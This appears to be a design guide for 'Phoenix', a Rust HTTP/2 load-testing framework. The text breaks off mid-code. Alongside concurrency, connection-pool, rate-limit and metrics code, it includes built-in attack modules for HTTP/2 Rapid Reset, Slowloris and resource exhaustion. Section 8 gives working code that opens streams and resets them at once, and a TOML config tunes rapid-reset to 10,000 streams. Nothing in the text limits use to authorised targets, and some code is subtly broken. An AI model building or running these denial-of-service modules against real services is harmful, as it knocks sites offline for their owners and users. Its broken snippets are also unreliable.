# Rust Async Architecture for High-Performance HTTP/2 Stress Testing Framework

## Executive Summary

This document provides a comprehensive guide to building Phoenix, a high-performance HTTP/2 stress testing framework in Rust capable of handling 100k+ concurrent connections. The architecture focuses on extreme concurrency, efficient resource utilization, accurate rate limiting, and comprehensive metrics collection.

## Table of Contents

1. [Massive Concurrency Patterns](#1-massive-concurrency-patterns)
2. [HTTP/2 Connection Management](#2-http2-connection-management)
3. [Rate Limiting Architecture](#3-rate-limiting-architecture)
4. [Backpressure and Flow Control](#4-backpressure-and-flow-control)
5. [Error Handling and Resilience](#5-error-handling-and-resilience)
6. [Performance Profiling](#6-performance-profiling)
7. [Configuration System](#7-configuration-system)
8. [Attack Module System](#8-attack-module-system)
9. [Metrics and Reporting](#9-metrics-and-reporting)
10. [Deployment Considerations](#10-deployment-considerations)

## Architecture Overview

```
┌─────────────────────────────────────────────────────────────┐
│                    Phoenix Framework                         │
├─────────────────────────────────────────────────────────────┤
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐         │
│  │   CLI Layer │  │ Config Layer│  │  Plugin     │         │
│  │  (clap)     │◄─┤  (serde)    │◄─┤  Registry   │         │
│  └─────────────┘  └─────────────┘  └─────────────┘         │
│           │               │               │                 │
│           ▼               ▼               ▼                 │
│  ┌─────────────────────────────────────────────────────┐   │
│  │              Attack Orchestrator                    │   │
│  │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐ │   │
│  │  │ Rate        │  │ Connection  │  │  Worker     │ │   │
│  │  │ Controller  │  │   Pool      │  │   Pool      │ │   │
│  │  │ (governor)  │  │ (hyper/h2)  │  │ (tokio)     │ │   │
│  │  └─────────────┘  └─────────────┘  └─────────────┘ │   │
│  └─────────────────────────────────────────────────────┘   │
│                     │         │         │                  │
│                     ▼         ▼         ▼                  │
│          ┌─────────────┬─────────────┬─────────────┐      │
│          │ HTTP/2      │   Slowloris │ Resource    │      │
│          │ Rapid Reset │   Attack    │ Exhaustion  │      │
│          │ Attack      │             │ Attack      │      │
│          └─────────────┴─────────────┴─────────────┘      │
│                     │         │         │                  │
│                     ▼         ▼         ▼                  │
│          ┌─────────────────────────────────────────┐      │
│          │          Network Layer                  │      │
│          │  ┌─────────────────────────────────┐    │      │
│          │  │    Socket Optimization          │    │      │
│          │  │  • TCP_NODELAY                 │    │      │
│          │  │  • SO_REUSEPORT                │    │      │
│          │  │  • Buffer tuning               │    │      │
│          │  └─────────────────────────────────┘    │      │
│          │  ┌─────────────────────────────────┐    │      │
│          │  │    TLS Configuration            │    │      │
│          │  │  • HTTP/2 ALPN                 │    │      │
│          │  │  • Session resumption          │    │      │
│          │  │  • Cipher suite optimization   │    │      │
│          │  └─────────────────────────────────┘    │      │
│          └─────────────────────────────────────────┘      │
│                     │                                      │
│                     ▼                                      │
│          ┌─────────────────────────────────────────┐      │
│          │          Metrics & Reporting            │      │
│          │  • Request latency histogram           │      │
│          │  • Error rate tracking                 │      │
│          │  • Throughput monitoring               │      │
│          │  • Coordinated omission detection      │      │
│          └─────────────────────────────────────────┘      │
└─────────────────────────────────────────────────────────────┘
```

## 1. Massive Concurrency Patterns

### Task Management Strategies

#### JoinSet vs FuturesUnordered

```rust
// JoinSet: Structured task management with error propagation
use tokio::task::JoinSet;

async fn manage_with_joinset() -> Result<(), Box<dyn std::error::Error>> {
    let mut set = JoinSet::new();
    
    for i in 0..100_000 {
        set.spawn(async move {
            // Task logic
            tokio::time::sleep(Duration::from_millis(10)).await;
            i
        });
    }
    
    while let Some(res) = set.join_next().await {
        match res {
            Ok(val) => println!("Task completed: {}", val),
            Err(e) => eprintln!("Task failed: {:?}", e),
        }
    }
    Ok(())
}

// FuturesUnordered: Lightweight, unordered completion
use futures::stream::{FuturesUnordered, StreamExt};

async fn manage_with_futures_unordered() {
    let mut futures = FuturesUnordered::new();
    
    for i in 0..100_000 {
        futures.push(async move {
            tokio::time::sleep(Duration::from_millis(10)).await;
            i
        });
    }
    
    while let Some(result) = futures.next().await {
        println!("Task completed: {}", result);
    }
}
```

**Performance Comparison:**
- **JoinSet**: ~2-3μs overhead per task, better for error handling
- **FuturesUnordered**: ~1-2μs overhead per task, better for fire-and-forget
- **Recommendation**: Use `FuturesUnordered` for connection handling

### Worker Pool Architecture

```rust
use tokio::sync::mpsc;
use std::sync::Arc;

struct WorkerPool {
    workers: Vec<tokio::task::JoinHandle<()>>,
    sender: mpsc::Sender<Task>,
    worker_count: usize,
}

impl WorkerPool {
    async fn new(num_workers: usize, queue_size: usize) -> Self {
        let (sender, mut receiver) = mpsc::channel::<Task>(queue_size);
        let mut workers = Vec::with_capacity(num_workers);
        
        for worker_id in 0..num_workers {
            let receiver = receiver.clone();
            let worker = tokio::spawn(async move {
                while let Some(task) = receiver.recv().await {
                    process_task(worker_id, task).await;
                }
            });
            workers.push(worker);
        }
        
        Self { workers, sender, worker_count: num_workers }
    }
    
    async fn submit(&self, task: Task) -> Result<(), mpsc::error::SendError<Task>> {
        self.sender.send(task).await
    }
    
    fn optimal_worker_count() -> usize {
        // Based on CPU cores and expected I/O wait time
        let cores = num_cpus::get();
        std::cmp::max(cores * 2, 4)  // 2x cores, minimum 4
    }
}
```

### Memory Optimization for 100k+ Tasks

```rust
struct LightweightTask {
    data: Arc<[u8]>,  // Shared data
    state: TaskState,
}

impl LightweightTask {
    fn new(size: usize) -> Self {
        Self {
            data: Arc::new(vec![0u8; size]),
            state: TaskState::Pending,
        }
    }
    
    async fn execute(&mut self) {
        // Minimal allocation in hot path
        self.state = TaskState::Running;
        // Task logic...
        self.state = TaskState::Completed;
    }
}

// Task pooling to reduce allocations
struct TaskPool {
    pool: Vec<LightweightTask>,
    next_id: AtomicUsize,
}

impl TaskPool {
    fn get_task(&mut self) -> &mut LightweightTask {
        let id = self.next_id.fetch_add(1, Ordering::Relaxed) % self.pool.len();
        &mut self.pool[id]
    }
}
```

## 2. HTTP/2 Connection Management

### Connection Pool Design

```rust
use hyper::client::HttpConnector;
use hyper_rustls::HttpsConnector;
use std::time::{Duration, Instant};
use tokio::sync::{Mutex, Semaphore};

struct ConnectionPool {
    connections: Arc<Mutex<VecDeque<PooledConnection>>>,
    max_size: usize,
    min_size: usize,
    semaphore: Arc<Semaphore>,
    health_check_interval: Duration,
    stats: ConnectionStats,
}

struct PooledConnection {
    client: hyper::Client<HttpsConnector<HttpConnector>>,
    last_used: Instant,
    is_healthy: bool,
    stream_count: AtomicUsize,
    max_streams: usize,
}

impl ConnectionPool {
    async fn new(max_size: usize, min_size: usize) -> Self {
        let connections = Arc::new(Mutex::new(VecDeque::with_capacity(max_size)));
        let semaphore = Arc::new(Semaphore::new(max_size));
        
        // Initialize minimum connections
        let mut conns = connections.lock().await;
        for _ in 0..min_size {
            let conn = Self::create_connection().await.unwrap();
            conns.push_back(conn);
        }
        
        Self {
            connections,
            max_size,
            min_size,
            semaphore,
            health_check_interval: Duration::from_secs(30),
            stats: ConnectionStats::new(),
        }
    }
    
    async fn get_connection(&self) -> Result<PooledConnection, PoolError> {
        let permit = self.semaphore.acquire().await?;
        
        let mut connections = self.connections.lock().await;
        
        // Try to find healthy connection
        while let Some(mut conn) = connections.pop_front() {
            if conn.is_healthy && conn.last_used.elapsed() < Duration::from_secs(60) {
                drop(connections);
                self.stats.record_hit();
                return Ok(PooledConnection {
                    client: conn.client,
                    last_used: Instant::now(),
                    is_healthy: true,
                    stream_count: AtomicUsize::new(0),
                    max_streams: conn.max_streams,
                });
            }
        }
        
        drop(connections);
        
        // Create new connection
        self.stats.record_miss();
        let client = self.create_http2_client().await?;
        Ok(PooledConnection {
            client,
            last_used: Instant::now(),
            is_healthy: true,
            stream_count: AtomicUsize::new(0),
            max_streams: 100,  // HTTP/2 default
        })
    }
    
    async fn create_http2_client(&self) -> Result<hyper::Client<HttpsConnector<HttpConnector>>, PoolError> {
        let https = HttpsConnector::with_native_roots();
        let client = hyper::Client::builder()
            .http2_only(true)  // Force HTTP/2
            .http2_initial_stream_window_size(1024 * 1024 * 2)  // 2MB
            .http2_initial_connection_window_size(1024 * 1024 * 4)  // 4MB
            .build(https);
        Ok(client)
    }
}
```

### HTTP/2 Multiplexing Optimization

```rust
struct H2Multiplexer {
    connection: Arc<PooledConnection>,
    pending_streams: HashMap<StreamId, PendingRequest>,
    max_concurrent_streams: usize,
    available_streams: Semaphore,
    stream_reuse: bool,
}

impl H2Multiplexer {
    fn calculate_optimal_connections(&self, target_rps: u32, avg_latency: Duration) -> usize {
        // Little's Law: L = λW
        let concurrent_streams_needed = (target_rps as f64 * avg_latency.as_secs_f64()).ceil() as usize;
        
        // Account for HTTP/2 stream limits
        let connections_needed = (concurrent_streams_needed as f64 / self.max_concurrent_streams as f64).ceil() as usize;
        
        // Add buffer for headroom
        std::cmp::max(connections_needed * 120 / 100, 1)  // 20% buffer
    }
    
    async fn send_request(&self, request: Request<()>) -> Result<Response, H2Error> {
        let permit = self.available_streams.acquire().await?;
        
        let response = self.connection.client.request(request).await?;
        
        // Don't drop permit immediately - keep for pipelining
        tokio::spawn(async move {
            // Process response...
            drop(permit);
        });
        
        Ok(response)
    }
}
```

## 3. Rate Limiting Architecture

### Coordinated Omission-Aware Rate Limiter

```rust
use governor::{Quota, RateLimiter};
use std::time::{Instant, Duration};
use tokio::sync::Mutex;

struct CoordinatedOmissionAwareLimiter {
    target_interval: Duration,
    last_scheduled: Mutex<Instant>,
    omission_stats: Arc<OmissionStats>,
    histogram: Arc<Histogram<u64>>,
    adjustment_strategy: AdjustmentStrategy,
}

impl CoordinatedOmissionAwareLimiter {
    async fn next_send_time(&self) -> Instant {
        let mut last = self.last_scheduled.lock().await;
        let now = Instant::now();
        
        // Calculate when next request should have been sent
        let next_theoretical = *last + self.target_interval;
        
        if now >= next_theoretical {
            // We're behind - record coordinated omission
            let delay = now.duration_since(next_theoretical);
            self.omission_stats.record(delay);
            
            // Apply adjustment strategy
            match self.adjustment_strategy {
                AdjustmentStrategy::Ignore => {
                    // Continue from now
                    *last = now;
                    now
                }
                AdjustmentStrategy::CatchUp => {
                    // Try to catch up by reducing interval temporarily
                    let catch_up_interval = self.target_interval / 2;
                    *last = now + catch_up_interval;
                    now
                }
                AdjustmentStrategy::Skip => {
                    // Skip to next theoretical slot
                    *last = next_theoretical + self.target_interval;
                    next_theoretical + self.target_interval
                }
            }
        } else {
            // Schedule at theoretical time
            *last = next_theoretical;
            next_theoretical
        }
    }
    
    fn omission_score(&self) -> f64 {
        let stats = self.omission_stats.snapshot();
        if stats.total_requests > 0 {
            stats.omitted_requests as f64 / stats.total_requests as f64
        } else {
            0.0
        }
    }
}
```

### Adaptive Rate Control

```rust
struct AdaptiveRateController {
    target_rps: u32,
    current_rps: AtomicU32,
    error_rate_threshold: f64,
    latency_threshold: Duration,
    adjustment_factor: f64,
    min_rps: u32,
    max_rps: u32,
}

impl AdaptiveRateController {
    fn adjust_based_on_metrics(&self, metrics: &AttackMetrics) -> u32 {
        let current_error_rate = metrics.error_rate();
        let current_latency = metrics.p95_latency();
        
        let mut new_rps = self.current_rps.load(Ordering::Relaxed);
        
        if current_error_rate > self.error_rate_threshold {
            // Reduce rate due to high errors
            new_rps = (new_rps as f64 * (1.0 - self.adjustment_factor)) as u32;
        } else if current_latency > self.latency_threshold {
            // Reduce rate due to high latency
            new_rps = (new_rps as f64 * (1.0 - self.adjustment_factor * 0.5)) as u32;
        } else if current_error_rate < self.error_rate_threshold * 0.5 
                  && current_latency < self.latency_threshold * 0.5 {
            // Increase rate cautiously
            new_rps = (new_rps as f64 * (1.0 + self.adjustment_factor * 0.25)) as u32;
        }
        
        // Clamp to min/max
        new_rps = new_rps.clamp(self.min_rps, self.max_rps);
        self.current_rps.store(new_rps, Ordering::Release);
        
        new_rps
    }
}
```

## 4. Backpressure and Flow Control

### HTTP/2 Window Management

```rust
struct H2FlowController {
    connection_window: Arc<AtomicU32>,
    stream_windows: DashMap<StreamId, Arc<AtomicU32>>,
    window_update_receiver: mpsc::Receiver<WindowUpdate>,
    max_window_size: u32,
    min_window_size: u32,
}

impl H2FlowController {
    async fn wait_for_window(&self, stream_id: StreamId, needed: u32) -> Result<(), FlowControlError> {
        let start = Instant::now();
        let timeout = Duration::from_secs(5);
        
        loop {
            if let Some(window) = self.stream_windows.get(&stream_id) {
                if window.load(Ordering::Acquire) >= needed {
                    return Ok(());
                }
            }
            
            // Check timeout
            if start.elapsed() > timeout {
                return Err(FlowControlError::Timeout);
            }
            
            // Wait for window update or small sleep
            tokio::select! {
                update = self.window_update_receiver.recv() => {
                    if let Some(update) = update {
                        self.handle_window_update(update).await;
                    }
                }
                _ = tokio::time::sleep(Duration::from_millis(1)) => {
                    // Continue checking
                }
            }
        }
    }
    
    fn calculate_optimal_window(&self, bandwidth_bps: f64, rtt: Duration) -> u32 {
        // Bandwidth-Delay Product (BDP) calculation
        let bdp_bytes = (bandwidth_bps * rtt.as_secs_f64() / 8.0) as u32;
        
        // For HTTP/2, research shows 2-3x BDP works well
        let optimal = bdp_bytes * 3;
        
        // Clamp to reasonable bounds
        optimal.clamp(self.min_window_size, self.max_window_size)
    }
    
    async fn adaptive_window_adjustment(&self, metrics: &NetworkMetrics) {
        // Adjust window sizes based on network conditions
        let new_window = self.calculate_optimal_window(
            metrics.bandwidth_bps,
            metrics.rtt,
        );
        
        // Update connection window
        self.connection_window.store(new_window, Ordering::Release);
        
        // Update all stream windows proportionally
        for mut entry in self.stream_windows.iter_mut() {
            let stream_window = entry.value_mut();
            let current = stream_window.load(Ordering::Acquire);
            let new = (current as f64 * (new_window as f64 / self.max_window_size as f64)) as u32;
            stream_window.store(new, Ordering::Release);
        }
    }
}

## 5. Error Handling and Resilience

### Comprehensive Error Hierarchy

```rust
use thiserror::Error;
use std::time::Duration;

#[derive(Error, Debug)]
pub enum PhoenixError {
    #[error("Network error: {0}")]
    Network(#[from] std::io::Error),
    
    #[error("TLS handshake failed: {0}")]
    Tls(#[from] rustls::Error),
    
    #[error("HTTP/2 protocol error: {0}")]
    Http2(#[from] h2::Error),
    
    #[error("Request timeout after {0:?}")]
    Timeout(Duration),
    
    #[error("Rate limit exceeded: {0}/sec")]
    RateLimit(u32),
    
    #[error("Connection pool exhausted: {0} max, {1} in use")]
    PoolExhausted(usize, usize),
    
    #[error("Invalid configuration: {0}")]
    Config(String),
    
    #[error("Attack module error: {0}")]
    AttackModule(Box<dyn std::error::Error + Send + Sync>),
    
    #[error("Resource exhaustion: {0}")]
    ResourceExhaustion(String),
    
    #[error("Backpressure: {0}")]
    Backpressure(String),
}

impl PhoenixError {
    pub fn category(&self) -> ErrorCategory {
        match self {
            PhoenixError::Network(_) => ErrorCategory::Network,
            PhoenixError::Tls(_) => ErrorCategory::Security,
            PhoenixError::Http2(_) => ErrorCategory::Protocol,
            PhoenixError::Timeout(_) => ErrorCategory::Timeout,
            PhoenixError::RateLimit(_) => ErrorCategory::RateLimit,
            PhoenixError::PoolExhausted(_, _) => ErrorCategory::Resource,
            PhoenixError::Config(_) => ErrorCategory::Configuration,
            PhoenixError::AttackModule(_) => ErrorCategory::Module,
            PhoenixError::ResourceExhaustion(_) => ErrorCategory::Resource,
            PhoenixError::Backpressure(_) => ErrorCategory::Backpressure,
        }
    }
    
    pub fn should_retry(&self) -> bool {
        match self {
            PhoenixError::Network(_) => true,
            PhoenixError::Timeout(_) => true,
            PhoenixError::Http2(e) => e.is_io_error(),  // Some HTTP/2 errors are retryable
            _ => false,
        }
    }
    
    pub fn is_fatal(&self) -> bool {
        match self {
            PhoenixError::Config(_) => true,
            PhoenixError::ResourceExhaustion(_) => true,
            _ => false,
        }
    }
}
```

### Retry Logic with Exponential Backoff

```rust
struct RetryPolicy {
    max_retries: usize,
    base_delay: Duration,
    max_delay: Duration,
    jitter: bool,
    retryable_errors: Vec<ErrorCategory>,
}

impl RetryPolicy {
    async fn execute_with_retry<F, T, E>(&self, mut operation: F) -> Result<T, E>
    where
        F: FnMut() -> Result<T, E>,
        E: Into<PhoenixError>,
    {
        let mut attempt = 0;
        let mut delay = self.base_delay;
        
        loop {
            match operation() {
                Ok(result) => return Ok(result),
                Err(e) => {
                    let phoenix_error: PhoenixError = e.into();
                    
                    // Check if error is retryable
                    if !self.retryable_errors.contains(&phoenix_error.category()) {
                        return Err(e);
                    }
                    
                    attempt += 1;
                    if attempt > self.max_retries {
                        return Err(e);
                    }
                    
                    // Calculate delay with optional jitter
                    let actual_delay = if self.jitter {
                        let jitter = rand::random::<f64>() * 0.3 - 0.15; // ±15% jitter
                        delay.mul_f64(1.0 + jitter)
                    } else {
                        delay
                    };
                    
                    // Wait before retry
                    tokio::time::sleep(actual_delay).await;
                    
                    // Exponential backoff with cap
                    delay = std::cmp::min(delay * 2, self.max_delay);
                }
            }
        }
    }
}

// Circuit breaker pattern
struct CircuitBreaker {
    failure_threshold: usize,
    reset_timeout: Duration,
    state: AtomicU8,  // 0: Closed, 1: Open, 2: HalfOpen
    failure_count: AtomicUsize,
    last_failure_time: Mutex<Instant>,
}

impl CircuitBreaker {
    async fn call<T, E, F>(&self, operation: F) -> Result<T, E>
    where
        F: FnOnce() -> Result<T, E>,
        E: Into<PhoenixError>,
    {
        match self.state.load(Ordering::Acquire) {
            0 => { // Closed
                match operation() {
                    Ok(result) => {
                        self.reset_failure_count();
                        Ok(result)
                    }
                    Err(e) => {
                        self.record_failure().await;
                        Err(e)
                    }
                }
            }
            1 => { // Open
                if self.should_try_reset().await {
                    self.state.store(2, Ordering::Release); // Half-open
                    match operation() {
                        Ok(result) => {
                            self.state.store(0, Ordering::Release); // Closed
                            self.reset_failure_count();
                            Ok(result)
                        }
                        Err(e) => {
                            self.state.store(1, Ordering::Release); // Open
                            self.record_failure().await;
                            Err(e)
                        }
                    }
                } else {
                    Err(PhoenixError::Backpressure("Circuit breaker open".to_string()).into())
                }
            }
            _ => unreachable!(),
        }
    }
}
```

## 6. Performance Profiling and Optimization

### Benchmarking with Criterion

```rust
use criterion::{criterion_group, criterion_main, Criterion, BenchmarkId};
use std::time::Duration;

fn benchmark_connection_pool(c: &mut Criterion) {
    let mut group = c.benchmark_group("connection_pool");
    
    // Configure benchmarking
    group.sample_size(1000);
    group.measurement_time(Duration::from_secs(30));
    group.warm_up_time(Duration::from_secs(5));
    group.confidence_level(0.99);
    
    // Test different pool sizes
    for size in [10, 100, 1000, 10000].iter() {
        group.bench_with_input(
            BenchmarkId::new("borrow_return", size),
            size,
            |b, &size| {
                b.to_async(tokio::runtime::Runtime::new().unwrap())
                    .iter(|| async {
                        let pool = ConnectionPool::new(size, size / 10).await;
                        let conn = pool.borrow().await.unwrap();
                        pool.return_connection(conn).await;
                    });
            },
        );
    }
    
    // Benchmark concurrent access
    group.bench_function("concurrent_access", |b| {
        b.to_async(tokio::runtime::Runtime::new().unwrap())
            .iter(|| async {
                let pool = ConnectionPool::new(100, 10).await;
                let mut tasks = Vec::new();
                
                for _ in 0..100 {
                    let pool = pool.clone();
                    tasks.push(tokio::spawn(async move {
                        let conn = pool.borrow().await.unwrap();
                        tokio::time::sleep(Duration::from_micros(100)).await;
                        pool.return_connection(conn).await;
                    }));
                }
                
                for task in tasks {
                    task.await.unwrap();
                }
            });
    });
    
    group.finish();
}

// Benchmark rate limiting
fn benchmark_rate_limiting(c: &mut Criterion) {
    let mut group = c.benchmark_group("rate_limiting");
    
    for rps in [100, 1000, 10000, 100000].iter() {
        group.bench_with_input(
            BenchmarkId::new("acquire_permit", rps),
            rps,
            |b, &rps| {
                b.to_async(tokio::runtime::Runtime::new().unwrap())
                    .iter(|| async {
                        let limiter = RateLimiter::direct(Quota::per_second(NonZeroU32::new(rps).unwrap()));
                        limiter.until_ready().await;
                    });
            },
        );
    }
    
    group.finish();
}

criterion_group!(
    benches,
    benchmark_connection_pool,
    benchmark_rate_limiting
);
criterion_main!(benches);
```

### Memory Profiling

```rust
// Memory tracking for connection pool
struct MemoryTracker {
    total_allocated: AtomicUsize,
    peak_usage: AtomicUsize,
    allocation_map: Mutex<HashMap<String, usize>>,
}

impl MemoryTracker {
    fn track_allocation(&self, category: &str, size: usize) {
        self.total_allocated.fetch_add(size, Ordering::Relaxed);
        
        let current = self.total_allocated.load(Ordering::Relaxed);
        let peak = self.peak_usage.load(Ordering::Relaxed);
        if current > peak {
            self.peak_usage.store(current, Ordering::Relaxed);
        }
        
        let mut map = self.allocation_map.lock().unwrap();
        *map.entry(category.to_string()).or_insert(0) += size;
    }
    
    fn report(&self) -> MemoryReport {
        MemoryReport {
            total_allocated: self.total_allocated.load(Ordering::Relaxed),
            peak_usage: self.peak_usage.load(Ordering::Relaxed),
            allocation_breakdown: self.allocation_map.lock().unwrap().clone(),
        }
    }
}

// Global memory tracker
static MEMORY_TRACKER: MemoryTracker = MemoryTracker {
    total_allocated: AtomicUsize::new(0),
    peak_usage: AtomicUsize::new(0),
    allocation_map: Mutex::new(HashMap::new()),
};

// Custom allocator for tracking
#[global_allocator]
static TRACKING_ALLOCATOR: TrackingAllocator<std::alloc::System> = TrackingAllocator::new(std::alloc::System);

struct TrackingAllocator<A: std::alloc::GlobalAlloc>(A);

impl<A: std::alloc::GlobalAlloc> TrackingAllocator<A> {
    const fn new(allocator: A) -> Self {
        Self(allocator)
    }
}

unsafe impl<A: std::alloc::GlobalAlloc> std::alloc::GlobalAlloc for TrackingAllocator<A> {
    unsafe fn alloc(&self, layout: std::alloc::Layout) -> *mut u8 {
        let ptr = self.0.alloc(layout);
        if !ptr.is_null() {
            MEMORY_TRACKER.track_allocation("general", layout.size());
        }
        ptr
    }
    
    unsafe fn dealloc(&self, ptr: *mut u8, layout: std::alloc::Layout) {
        self.0.dealloc(ptr, layout);
    }
}
```

### CPU Profiling with Flamegraphs

```bash
#!/bin/bash
# profiling.sh

# Install required tools
cargo install flamegraph

# Generate CPU flamegraph
RUSTFLAGS="-g" cargo flamegraph \
    --bin phoenix \
    -- \
    --target https://example.com \
    --rps 10000 \
    --duration 30s \
    --output profile.svg

# Generate memory flamegraph
cargo flamegraph --mem --bin phoenix -- --target https://example.com --rps 10000

# Use perf for detailed analysis
perf record -g --call-graph dwarf ./target/release/phoenix
perf report --no-children

# Generate differential flamegraph
# First run baseline
cargo flamegraph --bin phoenix -- --baseline
# Then run optimized
cargo flamegraph --bin phoenix -- --optimized
# Compare
difffolded.pl baseline.folded optimized.folded | flamegraph.pl > diff.svg
```

## 7. Configuration System

### TOML Configuration Structure

```toml
# phoenix.toml
[global]
name = "http2-stress-test"
version = "1.0.0"
description = "High-performance HTTP/2 stress test"
duration = "5m"
report_interval = "10s"
output_dir = "./results"
log_level = "info"

[rate_limiting]
target_rps = 10000
burst_multiplier = 1.5
adaptive = true
min_rps = 100
max_rps = 100000
adjustment_interval = "1s"

[connection_pool]
max_size = 1000
min_size = 100
idle_timeout = "30s"
health_check_interval = "10s"
max_lifetime = "5m"
connection_timeout = "10s"
tcp_keepalive = "30s"

[socket]
tcp_nodelay = true
tcp_keepalive = true
so_reuseaddr = true
so_reuseport = true
send_buffer_size = "4MB"
recv_buffer_size = "4MB"

[tls]
alpn_protocols = ["h2", "http/1.1"]
session_resumption = true
session_tickets = true
ciphers = [
    "TLS13_CHACHA20_POLY1305_SHA256",
    "TLS13_AES_256_GCM_SHA384",
    "TLS13_AES_128_GCM_SHA256"
]

[metrics]
latency_percentiles = [50, 75, 90, 95, 99, 99.9]
histogram_precision = 3
coordinated_omission_tracking = true
memory_tracking = true

[[attacks]]
name = "rapid-reset"
module = "rapid_reset"
enabled = true
weight = 1.0

[attacks.config]
max_streams = 10000
reset_interval_ms = 1
target_path = "/api/v1/data"
headers = [
    "User-Agent: Phoenix/1.0",
    "Accept: application/json",
    "Content-Type: application/json"
]
body = '{"test": "data"}'

[[attacks]]
name = "slowloris"
module = "slowloris"
enabled = false
weight = 0.5

[attacks.config]
connections = 5000
send_interval_ms = 30000
partial_writes = true
keepalive = true

[reporting]
format = "json"  # json, yaml, text, html
include_timeline = true
include_histograms = true
include_recommendations = true
output_file = "report.json"
```

### Configuration Loading and Validation

```rust
use serde::{Deserialize, Serialize};
use validator::{Validate, ValidationError};
use std::path::PathBuf;

#[derive(Debug, Deserialize, Serialize, Validate)]
#[serde(deny_unknown_fields)]
pub struct PhoenixConfig {
    #[validate]
    pub global: GlobalConfig,
    
    #[validate]
    pub rate_limiting: RateLimitingConfig,
    
    #[validate]
    pub connection_pool: ConnectionPoolConfig,
    
    #[validate]
    pub attacks: Vec<AttackConfig>,
    
    #[validate]
    pub reporting: ReportingConfig,
}

impl PhoenixConfig {
    pub fn from_file(path: &PathBuf) -> Result<Self, ConfigError> {
        let content = std::fs::read_to_string(path)?;
        let config: Self = toml::from_str(&content)?;
        
        // Validate configuration
        config.validate()?;
        
        // Additional semantic validation
        Self::validate_semantics(&config)?;
        
        Ok(config)
    }
    
    fn validate_semantics(config: &Self) -> Result<(), ConfigError> {
        // Validate that total weight of attacks is reasonable
        let total_weight: f64 = config.attacks.iter()
            .filter(|a| a.enabled)
            .map(|a| a.weight)
            .sum();
        
        if total_weight > 10.0 {
            return Err(ConfigError::Validation(
                "Total attack weight cannot exceed 10.0".to_string()
            ));
        }
        
        // Validate connection pool settings
        if config.connection_pool.min_size > config.connection_pool.max_size {
            return Err(ConfigError::Validation(
                "Minimum pool size cannot exceed maximum pool size".to_string()
            ));
        }
        
        // Validate rate limiting
        if config.rate_limiting.min_rps > config.rate_limiting.max_rps {
            return Err(ConfigError::Validation(
                "Minimum RPS cannot exceed maximum RPS".to_string()
            ));
        }
        
        Ok(())
    }
    
    pub fn merge_with_cli(&self, cli_args: &CliArgs) -> Self {
        let mut merged = self.clone();
        
        // Override with CLI arguments
        if let Some(rps) = cli_args.rps {
            merged.rate_limiting.target_rps = rps;
        }
        
        if let Some(duration) = cli_args.duration {
            merged.global.duration = duration;
        }
        
        if let Some(target) = &cli_args.target {
            // Update attack configurations with new target
            for attack in &mut merged.attacks {
                if let Some(config) = &mut attack.config {
                    config.target = target.clone();
                }
            }
        }
        
        merged
    }
}
```

## 8. Attack Module System

### Plugin Architecture

```rust
use async_trait::async_trait;
use serde::{Deserialize, Serialize};
use std::any::Any;
use std::sync::Arc;

#[async_trait]
pub trait AttackModule: Send + Sync {
    async fn execute(&self, ctx: &AttackContext) -> Result<AttackResult, AttackError>;
    fn name(&self) -> &'static str;
    fn description(&self) -> &'static str;
    fn config_schema(&self) -> serde_json::Value;
    fn validate_config(&self, config: &serde_json::Value) -> Result<(), ValidationError>;
    fn as_any(&self) -> &dyn Any;
}

// Module registry for dynamic loading
struct ModuleRegistry {
    modules: HashMap<String, Box<dyn AttackModule>>,
    module_paths: Vec<PathBuf>,
    hot_reload: bool,
}

impl ModuleRegistry {
    fn new() -> Self {
        Self {
            modules: HashMap::new(),
            module_paths: vec![
                PathBuf::from("./modules"),
                PathBuf::from("/usr/local/lib/phoenix/modules"),
            ],
            hot_reload: false,
        }
    }
    
    fn load_all(&mut self) -> Result<(), LoadError> {
        for path in &self.module_paths {
            if path.exists() {
                self.load_from_directory(path)?;
            }
        }
        
        // Load built-in modules
        self.load_builtin_modules();
        
        Ok(())
    }
    
    fn load_from_directory(&mut self, dir: &PathBuf) -> Result<(), LoadError> {
        for entry in std::fs::read_dir(dir)? {
            let entry = entry?;
            let path = entry.path();
            
            if path.extension().and_then(|s| s.to_str()) == Some("so") {
                self.load_dynamic_module(&path)?;
            }
        }
        
        Ok(())
    }
    
    #[cfg(unix)]
    fn load_dynamic_module(&mut self, path: &PathBuf) -> Result<(), LoadError> {
        unsafe {
            let lib = libloading::Library::new(path)?;
            
            // Get module constructor
            let constructor: libloading::Symbol<fn() -> Box<dyn AttackModule>> =
                lib.get(b"create_module")?;
                
            let module = constructor();
            self.modules.insert(module.name().to_string(), module);
            
            // Keep library loaded
            std::mem::forget(lib);
        }
        
        Ok(())
    }
    
    fn load_builtin_modules(&mut self) {
        // Register built-in modules
        self.modules.insert(
            "rapid_reset".to_string(),
            Box::new(RapidResetAttack::default()),
        );
        
        self.modules.insert(
            "slowloris".to_string(),
            Box::new(SlowlorisAttack::default()),
        );
        
        self.modules.insert(
            "resource_exhaustion".to_string(),
            Box::new(ResourceExhaustionAttack::default()),
        );
    }
    
    fn get_module(&self, name: &str) -> Option<&dyn AttackModule> {
        self.modules.get(name).map(|m| m.as_ref())
    }
}
```

### Example Attack Module: HTTP/2 Rapid Reset

```rust
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RapidResetConfig {
    pub target: String,
    pub max_streams: usize,
    pub reset_interval_ms: u64,
    pub headers: Vec<String>,
    pub body: Option<String>,
    pub follow_redirects: bool,
}

pub struct RapidResetAttack {
    config: RapidResetConfig,
    stats: AttackStats,
}

impl RapidResetAttack {
    pub fn new(config: RapidResetConfig) -> Self {
        Self {
            config,
            stats: AttackStats::default(),
        }
    }
}

#[async_trait]
impl AttackModule for RapidResetAttack {
    async fn execute(&self, ctx: &AttackContext) -> Result<AttackResult, AttackError> {
        let mut results = Vec::new();
        let start_time = Instant::now();
        
        // Create HTTP/2 client
        let client = self.create_h2_client().await?;
        
        // Execute attack
        for i in 0..self.config.max_streams {
            if ctx.should_stop() {
                break;
            }
            
            let request = self.build_request(i);
            let stream_id = client.send_request(request, false)?;
            
            // Immediately reset the stream (Rapid Reset attack)
            client.reset_stream(stream_id, h2::Reason::CANCEL)?;
            
            // Record statistics
            self.stats.record_request(true);
            
            // Rate limiting
            if i % 100 == 0 {
                ctx.rate_limiter.acquire_n(100).await;
            }
            
            // Small delay between resets
            tokio::time::sleep(Duration::from_millis(self.config.reset_interval_ms)).await;
        }
        
        let duration = start_time.elapsed();
        Ok(AttackResult {
            attack_name: self.name().to_string(),
            duration,
            stats: self.stats.snapshot(),
